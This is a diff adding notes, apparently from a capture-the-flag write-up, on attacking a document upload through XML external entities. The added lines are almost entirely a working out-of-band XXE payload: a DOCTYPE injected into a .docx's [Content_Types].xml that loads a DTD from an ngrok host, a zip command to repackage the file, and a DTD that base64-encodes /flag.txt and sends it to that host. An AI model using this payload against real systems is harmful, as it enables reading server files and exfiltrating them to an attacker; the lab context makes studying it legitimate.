@@ -114,4 +114,16 @@ Content-Type: application/xml
 
 ![[Pasted image 20241215162646.png]]
 
+[Content_Types].xml add
 
+```xml
+<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % sp SYSTEM "https://6448-83-213-97-233.ngrok-free.app/dtd.xml"> %sp; %param1; ]> <r>&exfil;</r>
+```
+
+```bash
+zip test.docx ./*
+```
+
+```xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://6448-83-213-97-233.ngrok-free.app/exfil=%data;'>">
+```
